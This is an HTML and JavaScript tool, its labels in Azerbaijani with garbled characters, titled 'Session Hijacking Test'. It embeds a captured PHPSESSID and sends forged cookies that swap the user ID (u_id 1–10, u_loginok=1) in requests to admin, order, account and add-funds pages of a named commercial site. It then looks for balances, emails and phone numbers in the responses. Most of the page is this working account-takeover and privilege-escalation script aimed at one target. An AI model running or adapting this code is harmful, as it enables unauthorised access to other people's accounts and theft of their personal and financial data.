<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üç™ Session Hijacking Test</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }
        .header p {
            color: #666;
            font-size: 14px;
        }
        .user-selector {
            margin-bottom: 20px;
        }
        .user-selector label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        .user-selector select {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 14px;
        }
        .endpoint-selector {
            margin-bottom: 20px;
        }
        .endpoint-selector label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        .endpoint-selector select {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 14px;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
            margin-bottom: 15px;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .btn:active {
            transform: translateY(0);
        }
        .btn.secondary {
            background: #6c757d;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
            max-height: 300px;
            overflow-y: auto;
        }
        .result.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .result.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .result.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        .quick-test {
            margin-top: 20px;
            text-align: center;
        }
        .quick-test button {
            margin: 5px;
            padding: 8px 12px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 11px;
            cursor: pointer;
        }
        .quick-test button:hover {
            background: #218838;
        }
        .cookie-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 12px;
            color: #666;
        }
        .cookie-info h4 {
            color: #333;
            margin-bottom: 10px;
        }
        .cookie-info code {
            background: #e9ecef;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üç™ Session Hijacking Test</h1>
            <p>Mobil cihazdan session hijacking testi</p>
        </div>

        <div class="cookie-info">
            <h4>üîë M√∂vcud Session M…ôlumatlarƒ±:</h4>
            <p><strong>PHPSESSID:</strong> <code>0dd217dff888e74d1d28eee839336307</code></p>
            <p><strong>u_id:</strong> <code>6</code> (Kasmar hesabƒ±)</p>
            <p><strong>u_loginok:</strong> <code>1</code></p>
        </div>

        <div class="user-selector">
            <label for="userId">ƒ∞stifad…ô√ßi ID:</label>
            <select id="userId">
                <option value="1">User ID 1 (Admin)</option>
                <option value="2">User ID 2</option>
                <option value="3">User ID 3</option>
                <option value="4">User ID 4</option>
                <option value="5">User ID 5</option>
                <option value="6">User ID 6 (Kasmar)</option>
                <option value="7">User ID 7</option>
                <option value="8">User ID 8</option>
                <option value="9">User ID 9</option>
                <option value="10">User ID 10</option>
            </select>
        </div>

        <div class="endpoint-selector">
            <label for="endpoint">Test Edil…ôc…ôk S…ôhif…ô:</label>
            <select id="endpoint">
                <option value="/admin/">Admin Panel</option>
                <option value="/admin/dashboard">Admin Dashboard</option>
                <option value="/admin/users">Admin Users</option>
                <option value="/admin/orders">Admin Orders</option>
                <option value="/dashboard">User Dashboard</option>
                <option value="/orders">User Orders</option>
                <option value="/account">User Account</option>
                <option value="/addfunds">Add Funds</option>
                <option value="/services">Services</option>
                <option value="/neworder">New Order</option>
            </select>
        </div>

        <button onclick="testSessionHijacking()" class="btn">üç™ Session Hijacking Test Et</button>
        <button onclick="testAllEndpoints()" class="btn secondary">üåê B√ºt√ºn S…ôhif…ôl…ôri Test Et</button>
        <button onclick="testAllUsers()" class="btn secondary">üë• B√ºt√ºn ƒ∞stifad…ô√ßil…ôri Test Et</button>

        <div class="quick-test">
            <button onclick="quickTest(1, '/admin/')">Admin Panel</button>
            <button onclick="quickTest(2, '/dashboard')">User 2</button>
            <button onclick="quickTest(3, '/orders')">User 3</button>
            <button onclick="quickTest(4, '/account')">User 4</button>
        </div>

        <div id="result" class="result"></div>
    </div>

    <script>
        // Session hijacking test
        async function testSessionHijacking() {
            const userId = document.getElementById('userId').value;
            const endpoint = document.getElementById('endpoint').value;
            
            showResult('Session hijacking test edilir...', 'info');
            
            try {
                const response = await fetch('https://royzasmm.com.tr' + endpoint, {
                    method: 'GET',
                    headers: {
                        'Cookie': `PHPSESSID=0dd217dff888e74d1d28eee839336307; u_id=${userId}; u_loginok=1`,
                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1'
                    }
                });

                const html = await response.text();
                analyzeSessionResponse(html, userId, endpoint);
                
            } catch (error) {
                showResult('X…ôta ba≈ü verdi: ' + error.message, 'error');
            }
        }

        // Test all endpoints for current user
        async function testAllEndpoints() {
            const userId = document.getElementById('userId').value;
            const endpoints = [
                '/admin/', '/admin/dashboard', '/admin/users', '/admin/orders',
                '/dashboard', '/orders', '/account', '/addfunds', '/services', '/neworder'
            ];
            
            let results = `=== B√úT√úN S∆èHƒ∞F∆èL∆èRƒ∞N TESTƒ∞ (User ID: ${userId}) ===\n\n`;
            
            for (const endpoint of endpoints) {
                try {
                    const response = await fetch('https://royzasmm.com.tr' + endpoint, {
                        method: 'GET',
                        headers: {
                            'Cookie': `PHPSESSID=0dd217dff888e74d1d28eee839336307; u_id=${userId}; u_loginok=1`,
                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
                        }
                    });

                    const status = response.status;
                    const html = await response.text();
                    
                    if (status === 200) {
                        if (html.includes('admin') && endpoint.includes('admin')) {
                            results += `‚úÖ ${endpoint}: Admin panel…ô giri≈ü m√ºmk√ºnd√ºr!\n`;
                        } else if (html.includes('dashboard')) {
                            results += `‚úÖ ${endpoint}: Dashboard-a giri≈ü m√ºmk√ºnd√ºr!\n`;
                        } else {
                            results += `‚úÖ ${endpoint}: S…ôhif…ôy…ô giri≈ü m√ºmk√ºnd√ºr!\n`;
                        }
                    } else if (status === 403) {
                        results += `‚ùå ${endpoint}: Giri≈ü qadaƒüandƒ±r!\n`;
                    } else if (status === 404) {
                        results += `‚ö†Ô∏è ${endpoint}: S…ôhif…ô tapƒ±lmadƒ±!\n`;
                    } else {
                        results += `‚ùì ${endpoint}: HTTP ${status}\n`;
                    }
                    
                } catch (error) {
                    results += `‚ùå ${endpoint}: X…ôta - ${error.message}\n`;
                }
                
                await new Promise(resolve => setTimeout(resolve, 1000)); // Rate limiting
            }
            
            showResult(results, 'info');
        }

        // Test all users for current endpoint
        async function testAllUsers() {
            const endpoint = document.getElementById('endpoint').value;
            const userIds = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
            
            let results = `=== B√úT√úN ƒ∞STƒ∞FAD∆è√áƒ∞L∆èRƒ∞N TESTƒ∞ (${endpoint}) ===\n\n`;
            
            for (const userId of userIds) {
                try {
                    const response = await fetch('https://royzasmm.com.tr' + endpoint, {
                        method: 'GET',
                        headers: {
                            'Cookie': `PHPSESSID=0dd217dff888e74d1d28eee839336307; u_id=${userId}; u_loginok=1`,
                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
                        }
                    });

                    const status = response.status;
                    
                    if (status === 200) {
                        results += `‚úÖ User ID ${userId}: Giri≈ü m√ºmk√ºnd√ºr!\n`;
                    } else if (status === 403) {
                        results += `‚ùå User ID ${userId}: Giri≈ü qadaƒüandƒ±r!\n`;
                    } else if (status === 404) {
                        results += `‚ö†Ô∏è User ID ${userId}: S…ôhif…ô tapƒ±lmadƒ±!\n`;
                    } else {
                        results += `‚ùì User ID ${userId}: HTTP ${status}\n`;
                    }
                    
                } catch (error) {
                    results += `‚ùå User ID ${userId}: X…ôta - ${error.message}\n`;
                }
                
                await new Promise(resolve => setTimeout(resolve, 1000)); // Rate limiting
            }
            
            showResult(results, 'info');
        }

        // Quick test function
        function quickTest(userId, endpoint) {
            document.getElementById('userId').value = userId;
            document.getElementById('endpoint').value = endpoint;
            testSessionHijacking();
        }

        // Response analysis
        function analyzeSessionResponse(html, userId, endpoint) {
            let result = '';
            let resultClass = 'info';

            // Check for admin access
            if (endpoint.includes('admin')) {
                if (html.includes('login') && !html.includes('dashboard')) {
                    result = `‚ö†Ô∏è Admin Panel: User ID ${userId} admin panel…ô giri≈ü t…ôl…ôb olunur!\n`;
                    resultClass = 'error';
                } else if (html.includes('admin') || html.includes('dashboard')) {
                    result = `‚úÖ Admin Access: User ID ${userId} admin panel…ô giri≈ü ed…ô bil…ôr!\n`;
                    resultClass = 'success';
                } else {
                    result = `‚ùì Admin Panel: Nam…ôlum cavab!\n`;
                    resultClass = 'error';
                }
            }
            // Check for user access
            else {
                if (html.includes('dashboard') || html.includes('orders') || html.includes('account')) {
                    result = `‚úÖ User Access: User ID ${userId} ${endpoint} s…ôhif…ôsin…ô giri≈ü ed…ô bil…ôr!\n`;
                    resultClass = 'success';
                } else {
                    result = `‚ùì User Access: Nam…ôlum cavab!\n`;
                    resultClass = 'error';
                }
            }

            // Add response info
            result += `\nResponse Length: ${html.length} bytes`;
            result += `\nUser ID: ${userId}`;
            result += `\nEndpoint: ${endpoint}`;
            
            // Check for sensitive information
            if (html.includes('balance') || html.includes('bakiye')) {
                result += `\nüí∞ Balans m…ôlumatƒ± tapƒ±ldƒ±!`;
            }
            if (html.includes('email') || html.includes('phone')) {
                result += `\nüìß ≈û…ôxsi m…ôlumatlar tapƒ±ldƒ±!`;
            }
            
            showResult(result, resultClass);
        }

        // Show result
        function showResult(message, type) {
            const resultDiv = document.getElementById('result');
            resultDiv.textContent = message;
            resultDiv.className = 'result ' + type;
            resultDiv.style.display = 'block';
            resultDiv.scrollTop = 0;
        }

        // Mobile-specific optimizations
        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            document.body.style.fontSize = '16px'; // Prevent zoom on iOS
            document.querySelectorAll('select').forEach(select => {
                select.style.fontSize = '16px';
            });
        }
    </script>
</body>
</html>